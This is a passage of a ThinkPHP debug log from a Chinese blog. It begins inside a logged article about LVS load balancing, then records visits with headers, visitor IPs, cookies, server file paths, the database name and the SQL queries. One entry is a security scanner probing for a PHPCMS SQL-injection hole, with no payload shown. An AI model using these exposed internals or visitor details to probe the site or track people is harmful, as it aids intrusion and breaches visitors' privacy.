/proc/sys/net/ipv4/conf/lo/arp_announce<br/></span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">echo &quot;1&quot; &gt; /proc/sys/net/ipv4/conf/all/arp_ignore<br/></span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">echo &quot;1&quot; &gt; /proc/sys/net/ipv4/conf/all/arp_announce<br/></span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">配置完了就可以使用ipvsadm配置LVS-DR集群了</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">ipvsadm -A -t 10.10.120.193:80 -s rr &nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">ipvsadm -a -t&nbsp;10.10.120.193:80 -r 10.10.120.210:8000 -g &nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">ipvsadm -a -t&nbsp;10.10.120.193:80 -r 10.10.120.211:8000 -g &nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">-g 就意味着使用直接路由的方式转发数据包</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">LVS-DR 相较于LVS-NAT的最大优势在于LVS-DR不受调度器宽带的限制，例如假设三台服务器在WAN交换机出口宽带都限制为10Mbps，只要对于连接调度器和两台实际服务器的LAN交换机没有限速，那么，使用LVS-DR理论上可以达到20Mbps的最大出口宽带，因为它的实际服务器的响应数据包可以不经过调度器而直接发往用户端啊，所以它与调度器的出口宽带没有关系，只能自身的有关系。而如果使用LVS-NAT，集群只能最大使用10Mbps的宽带。所以，越是响应数据包远远超过请求数据包的服务，就越应该降低调度器转移请求的开销，也就越能提高整体的扩展能力，最终也就越依赖于WAN出口宽带。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">总的来说，LVS-DR适合搭建可扩展的负载均衡系统，不论是Web服务器还是文件服务器，以及视频服务器，它都拥有出色的性能。前提是你必须为实际器购买一系列的合法IP地址。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><h1 style=\"margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);\"><a target=\"_blank\" style=\"color: rgb(51, 102, 153);\" name=\"t5\"></a><span style=\"font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;\">六、IP隧道(LVS-TUN)</span></h1><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">基于IP隧道的请求转发机制：将调度器收到的IP数据包封装在一个新的IP数据包中，转交给实际服务器，然后实际服务器的响应数据包可以直接到达用户端。目前Linux大多支持，可以用LVS来实现，称为LVS-TUN，与LVS-DR不同的是，实际服务器可以和调度器不在同一个WANt网段，调度器通过IP隧道技术来转发请求到实际服务器，所以实际服务器也必须拥有合法的IP地址。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">总体来说，LVS-DR和LVS-TUN都适合响应和请求不对称的Web服务器，如何从它们中做出选择，取决于你的网络部署需要，因为LVS-TUN可以将实际服务器根据需要部署在不同的地域，并且根据就近访问的原则来转移请求，所以有类似这种需求的，就应该选择LVS-TUN。</span></p><p><br/></p>' , 1 , 1 , 1 , '韩会强' , 'images/j65vojmo_bza5qay57y4598bd17c0ab65.jpg' , '123.233.116.122' , 1502335355 , 1502335355) [ RunTime:0.003661s ]

---------------------------------------------------------------
[ 2017-08-10T11:22:37+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html
[ log ] hhqblog.com/admin/article/index.html [运行时间：0.026757s][吞吐率：37.37req/s] [内存消耗：3,755.91kb] [文件加载：53]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/admin/article/add_article.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/index.html [ array (
  0 => 'allpage',
  1 => 'current',
  2 => 'keyword',
  3 => 'count',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000284s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000808s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000152s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000830s ]

---------------------------------------------------------------
[ 2017-08-10T11:22:37+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html?page=1&keyword=
[ log ] hhqblog.com/admin/article/index.html?page=1&keyword= [运行时间：0.030852s][吞吐率：32.41req/s] [内存消耗：3,687.12kb] [文件加载：52]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'keyword' => '',
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000301s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000800s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000183s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000833s ]

---------------------------------------------------------------
[ 2017-08-10T11:22:47+08:00 ] 172.17.180.47 123.233.116.122 GET /
[ log ] hhqblog.com/ [运行时间：0.034596s][吞吐率：28.91req/s] [内存消耗：6,032.09kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000300s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000846s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000685s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000419s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000345s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001004s ]

---------------------------------------------------------------
[ 2017-08-10T11:22:47+08:00 ] 172.17.180.47 123.233.116.122 GET /index/index/index.html?page=1
[ log ] hhqblog.com/index/index/index.html?page=1 [运行时间：0.038548s][吞吐率：25.94req/s] [内存消耗：6,007.41kb] [文件加载：55]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://hhqblog.com/',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000329s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000820s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000707s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000426s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000427s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001060s ]

---------------------------------------------------------------
[ 2017-08-10T11:22:56+08:00 ] 172.17.180.47 123.233.116.122 GET /ar/51
[ log ] www.hhqblog.com/ar/51 [运行时间：0.030287s][吞吐率：33.02req/s] [内存消耗：4,411.52kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502266968%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.7.1502266983.1502266968.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '51',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000297s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000847s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000716s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 51 LIMIT 1 [ RunTime:0.000299s ]

---------------------------------------------------------------
[ 2017-08-10T11:25:51+08:00 ] 172.17.180.47 140.205.225.187 GET /index.php?m=wap&a=index&siteid=1
[ log ] www.hhqblog.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.035600s][吞吐率：28.09req/s] [内存消耗：6,032.73kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'www.hhqblog.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'm' => 'wap',
  'a' => 'index',
  'siteid' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000338s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.001802s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000835s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000441s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000436s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001140s ]

---------------------------------------------------------------
[ 2017-08-10T11:54:52+08:00 ] 172.17.180.47 106.11.153.67 GET /index/index/index/cate_id/31.html
[ log ] www.hhqblog.com/index/index/index/cate_id/31.html [运行时间：0.032989s][吞吐率：30.31req/s] [内存消耗：6,032.35kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn,en-us,zh-tw,en-gb,en;',
  'host' => 'www.hhqblog.com',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'user-agent' => 'YisouSpider',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'cate_id' => '31',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000275s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000818s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000697s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000407s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000348s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001004s ]

---------------------------------------------------------------
[ 2017-08-10T11:55:55+08:00 ] 172.17.180.47 117.71.34.139 GET /
[ log ] hhqblog.com/ [运行时间：0.032652s][吞吐率：30.63req/s] [内存消耗：6,031.73kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'zh-cn,zh;q=0.5',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000314s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000818s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000681s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000408s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000364s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001028s ]

---------------------------------------------------------------
[ 2017-08-10T12:08:57+08:00 ] 172.17.180.47 157.55.39.121 GET /ar/34.html
[ log ] hhqblog.com/ar/34.html [运行时间：0.032222s][吞吐率：31.03req/s] [内存消耗：4,392.05kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'pragma' => 'no-cache',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'from' => 'bingbot(at)microsoft.com',
  'host' => 'hhqblog.com',
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000317s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000838s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000743s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 34 LIMIT 1 [ RunTime:0.000268s ]

---------------------------------------------------------------
[ 2017-08-10T13:01:48+08:00 ] 172.17.180.47 106.11.242.6 GET /
[ log ] hhqblog.com/ [运行时间：0.037690s][吞吐率：26.53req/s] [内存消耗：6,001.38kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'user-agent' => 'Java/1.7.0_51',
  'host' => 'hhqblog.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000364s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000933s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.001023s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000442s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000478s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000349s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000404s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000340s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000917s ]

---------------------------------------------------------------
[ 2017-08-10T13:12:12+08:00 ] 172.17.180.47 106.11.226.137 GET /
[ log ] www.hhqblog.com/ [运行时间：0.032820s][吞吐率：30.47req/s] [内存消耗：6,059.24kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'user-agent' => 'Java/1.7.0_51',
  'host' => 'www.hhqblog.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
